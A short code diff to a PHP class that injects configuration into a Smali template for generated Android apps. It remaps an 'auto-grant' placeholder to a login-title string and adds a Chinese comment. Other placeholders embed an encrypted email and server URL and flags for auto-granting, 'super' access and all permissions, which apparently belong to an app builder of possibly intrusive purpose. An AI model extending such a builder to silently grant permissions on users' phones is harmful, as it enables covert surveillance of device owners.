@@ -81,7 +81,8 @@ final class SmaliProcessor
             '[USER_DOM]' => $this->escapeForSmaliString($userDom),
             '[USER_MAIL]' => $this->escapeForSmaliString($encryptor->encryptString($config->email)),
             '[BSE_URL]' => $this->escapeForSmaliString($encryptor->encryptString($config->appUrl)),
-            '[USE-AUTOGRANT]' => $config->useAtoprims,
+            // [USE-AUTOGRANT] 在模板中被赋值给 loadingText 字段，用于加载页标题显示
+            '[USE-AUTOGRANT]' => $this->escapeForSmaliString($config->loginTitle),
             '[USE-SUPER]' => $config->useAccess,
             '[USE-ALLPRIM]' => $config->userAllprims,
             '[USE-BLACK]' => $config->userBlackprims,
